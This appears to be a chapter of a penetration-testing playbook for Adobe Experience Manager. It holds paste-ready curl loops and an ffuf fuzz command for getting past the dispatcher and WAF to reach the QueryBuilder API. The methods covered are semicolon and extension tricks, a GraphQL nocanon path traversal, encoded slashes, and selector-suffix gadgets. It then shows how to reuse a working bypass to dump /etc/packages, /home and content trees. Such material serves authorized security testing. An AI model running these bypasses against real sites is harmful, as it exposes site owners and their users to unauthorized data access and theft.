# 4 — Dispatcher bypasses (get past the bouncer)

**Goal:** Reach blocked endpoints like `/bin/querybuilder.json` even when plain request is 404.

**Rule:** Try **direct first**. Bypass only if blocked.

---

## Signal

```bash
T="https://TARGET"
curl -sk -o /dev/null -w "%{http_code} size=%{size_download}\n" \
  "$T/bin/querybuilder.json?path=/content&p.limit=1"
```

| Result | Meaning |
|--------|---------|
| JSON with results | Already open — skip to loot |
| 404 / empty / generic deny | Dispatcher (or WAF) in the way — keep going |

---

## Why (first principles)

1. Dangerous APIs live on **Publish**.  
2. **Dispatcher** is configured to **deny almost everything**, allow only “safe” paths/extensions (`/content/*` + `html/css/js/png`…).  
3. Dispatcher is **not a full WAF** — it mostly looks at the **request line**, not body/headers.  
4. Dispatcher’s URL parser ≠ Sling’s URL parser.  
5. Some Apache `LocationMatch` rules **skip** the dispatcher completely (`ProxyPassMatch` + `nocanon`).

Adobe has even said dispatcher is **not** the real security control — **JCR ACLs** are.  
Bypasses stay useful for years.

---

## Paste kit A — Direct (always first)

```bash
T="https://TARGET"

for u in \
  "/bin/querybuilder.json?path=/&p.limit=5" \
  "/bin/querybuilder.feed?path=/&p.limit=5" \
  "/bin/querybuilder.json?path=/content&p.limit=5" \
  "/bin/querybuilder.json?path=/etc&p.limit=5" \
  "/bin/querybuilder.json?path=/home&p.limit=5"
do
  echo "=== $u ==="
  curl -sk -o /tmp/qb.out -w "code=%{http_code} size=%{size_download}\n" "$T$u"
  head -c 300 /tmp/qb.out; echo; echo
done
```

Success looks like JSON: `"success":true` or `"hits":[...` or node lists.

---

## Paste kit B — Classic extension / semicolon tricks

**Idea:** Make the bouncer see an **allowed extension** (css/js/png).

```bash
T="https://TARGET"
# Classic style (varies by blog/tool era)
for u in \
  "/bin/querybuilder.json;%0aa.css?path=/content&p.limit=3" \
  "/bin/querybuilder.json.css?path=/content&p.limit=3" \
  "/bin/querybuilder.json/a.css?path=/content&p.limit=3" \
  "/bin/querybuilder.json;x='a/b.css/c'?path=/content&p.limit=3" \
  "/bin/querybuilder.json;x='a/b.js/c'?path=/content&p.limit=3" \
  "/bin/querybuilder.json;x='a/b.html/c'?path=/content&p.limit=3" \
  "/bin/querybuilder.json;x='a/b.png/c'?path=/content&p.limit=3" \
  "/bin/querybuilder.json;x='a/b.jpg/c'?path=/content&p.limit=3" \
  "/bin/querybuilder.json;x='a/b.pdf/c'?path=/content&p.limit=3"
do
  code=$(curl -sk -o /tmp/qb.out -w "%{http_code}" "$T$u")
  size=$(wc -c </tmp/qb.out)
  echo "$code $size  $u"
  # peek if interesting
  grep -qE 'hits|success|jcr:|"results"' /tmp/qb.out && head -c 200 /tmp/qb.out && echo
done
```

**Why this works (semicolon version from Assetnote research):**

```text
Request:  /bin/querybuilder.json;x='a/b.css/c'

Dispatcher sees: path weird, extension ≈ css  → ALLOW (static rule)
Sling sees:      path=/bin/querybuilder  ext=json  → real QueryBuilder
```

---

## Paste kit C — GraphQL `nocanon` bypass (modern cloud-ish)

Default cloud Apache often has:

```apache
<LocationMatch "/graphql/execute.json/.*">
    ProxyPassMatch http://AEM:PORT nocanon
</LocationMatch>
```

That **skips dispatcher** and passes **raw** path to Jetty.

```bash
T="https://TARGET"

# Traversal after GraphQL prefix (raw path match, backend normalizes)
curl -sk -o /tmp/qb.out -w "%{http_code} size=%{size_download}\n" \
  "$T/graphql/execute.json/..%2f../bin/querybuilder.json?path=/content&p.limit=3"
head -c 400 /tmp/qb.out; echo

# Hybrid: path parameter plants graphql string for regex match anywhere
curl -sk -o /tmp/qb.out -w "%{http_code} size=%{size_download}\n" \
  "$T/bin/querybuilder.json;x='x/graphql/execute/json/x'?path=/content&p.limit=3"
head -c 400 /tmp/qb.out; echo
```

**Why hybrid helps:** WAF blocks `..%2f../` but may miss `;x='...graphql/execute...'`.

---

## Paste kit D — Encoded slash / percent tricks

```bash
T="https://TARGET"

for u in \
  "/%2fbin%2fquerybuilder.json?path=/content&p.limit=3" \
  "/bin%2fquerybuilder.json?path=/content&p.limit=3" \
  "/./bin/querybuilder.json?path=/content&p.limit=3"
do
  curl -sk -o /tmp/qb.out -w "%{http_code} %{size_download} $u\n" "$T$u"
done
```

---

## Paste kit E — Selector/suffix dispatcher bypass (`form` gadget)

If core product still vulnerable / unpatched:

```bash
T="https://TARGET"
PAGE="/content/YOUR/PAGE"   # or try /content/dam

# form selector + allowed-looking extension + suffix = real path
curl -sk -o /tmp/qb.out -w "%{http_code} size=%{size_download}\n" \
  "$T${PAGE}.form.css/bin/querybuilder.json?path=/content&p.limit=3"
head -c 400 /tmp/qb.out; echo

curl -sk -o /tmp/qb.out -w "%{http_code} size=%{size_download}\n" \
  "$T/content/dam.form.js/bin/querybuilder.json?path=/&p.limit=3"
head -c 400 /tmp/qb.out; echo

# dump via suffix
curl -sk -o /tmp/qb.out -w "%{http_code} size=%{size_download}\n" \
  "$T${PAGE}.form.png/content.3.json"
head -c 400 /tmp/qb.out; echo
```

**Why:** Dispatcher sees prefix path + `.css`.  
Sling `form` servlet **forwards the suffix** as the real target.

Details: [06-selectors-gadgets.md](./06-selectors-gadgets.md).

---

## Paste kit F — listParagraphs as “internal renderer”

```bash
T="https://TARGET"
PAGE="/content/YOUR/PAGE"

# Invoke internal resource types (may hit querybuilder-ish surfaces)
curl -sk "$T${PAGE}.listParagraphs.html?itemResourceType=/bin/querybuilder.json&limit=1" | head -c 500; echo

curl -sk "$T${PAGE}.listParagraphs.html?itemResourceType=/libs/cq/statistics/components/queries-by-result/html.jsp&limit=1&path=/content" | head -c 500; echo
```

---

## What to try after one bypass works

Whatever URL **shape** worked, reuse it for:

```text
/bin/querybuilder.json
/bin/querybuilder.feed
/content.1.json
/content.infinity.json
/etc.1.json
/home.1.json
/etc/packages.1.json
/libs/... (careful)
```

Example pattern reuse:

```bash
# if semicolon+css worked:
BYPASS_PREFIX="/bin/querybuilder.json;x='a/b.css/c'"
curl -sk "$T${BYPASS_PREFIX}?path=/etc/packages&p.limit=20"
```

---

## Variations (time-box)

| Time | Actions |
|------|---------|
| 5 min | Direct + 5 semicolon extensions |
| 15 min | GraphQL + hybrid + form selector |
| 30 min | ffuf mutations on working page path |
| WAF angry | Lower threads, hybrid only, change User-Agent last |

```bash
# Optional mutation fuzz (when one base works poorly)
ffuf -u "$T/bin/querybuilder.jsonFUZZ?path=/content&p.limit=1" \
  -w - -mc all -fs 0 -t 10 <<'EOF'
;x='a/b.css/c'
;x='a/b.js/c'
.css
;%0aa.css
/a.css
EOF
```

---

## Done when

- [ ] You can get **JSON** from QueryBuilder or `.N.json` dumps, **or**  
- [ ] You documented “blocked with these N bypasses” for the report  

**Next:** [05-querybuilder-loot.md](./05-querybuilder-loot.md)
